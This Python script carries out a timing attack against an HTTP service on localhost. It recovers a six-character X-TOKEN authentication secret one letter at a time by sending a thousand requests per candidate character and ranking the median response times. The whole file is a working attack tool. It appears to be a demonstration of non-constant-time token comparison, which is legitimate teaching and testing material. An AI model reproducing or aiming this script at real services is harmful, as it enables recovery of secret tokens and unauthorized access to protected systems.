import time
import string
import requests
import statistics

from operator import itemgetter

URL = "http://localhost:8000"
N = 1000
TOKEN_SIZE = 6


def try_to_hack(characters):
    timings = []

    # Add an invalid character
    basic_auth = characters + "0" * (TOKEN_SIZE - len(characters))
    print('.', end='', flush=True)

    for i in range(N):
        before = time.perf_counter()
        result = requests.get(URL, headers={'X-TOKEN': basic_auth})
        after = time.perf_counter()

        if result.status_code != 403:
            raise Exception(result, result.status_code)
        elif result.status_code == 200:
            raise Exception(result, result.status_code)

        timings.append(after - before)

    return timings


def remove_outliers(distribution):
    mean = statistics.mean(distribution)
    stddev = statistics.stdev(distribution)

    return [x for x in distribution if (mean - 2*stddev) < x < (mean + 2*stddev)]


def do_a_call(characters):
    # Add an invalid character
    basic_auth = characters + "+"
    result = requests.get(URL, headers={'X-TOKEN': basic_auth})

    if result.status_code != 403:
            raise Exception(result, result.status_code)


def find_next_character(base):
    measures = []

    print("Trying to find the character at position %s with prefix %r" % ((len(base) + 1), base))
    for i, character in enumerate(string.ascii_lowercase):
        timings = try_to_hack(base + character)

        median = statistics.median(timings)
        min_timing = min(timings)
        max_timing = max(timings)
        stddev = statistics.stdev(timings)

        measures.append({'character': character, 'median': median, 'min': min_timing,
                         'max': max_timing, 'stddev': stddev})

    sorted_measures = list(sorted(measures, key=itemgetter('median'), reverse=True))

    found_character = sorted_measures[0]
    top_characters = sorted_measures[1:4]

    print("Found character at position %s: %r" % ((len(base) + 1), found_character['character']))
    print("Median: %s Max: %s Min: %s Stddev: %s" % (found_character['median'], found_character['max'], found_character['min'], found_character['stddev']))

    print()
    print("Following characters were:")

    for top_character in top_characters:
        print("Character: %r Median: %s Max: %s Min: %s Stddev: %s" % (top_character['character'], top_character['median'], top_character['max'], top_character['min'], top_character['stddev']))

    return found_character['character']


def main():
    # Do a first request to start the keep-alive connection
    requests.get(URL)

    base = ''

    while len(base) != TOKEN_SIZE:
        next_character = find_next_character(base)
        base += next_character
        print()
        print()



if __name__ == '__main__':
    main()
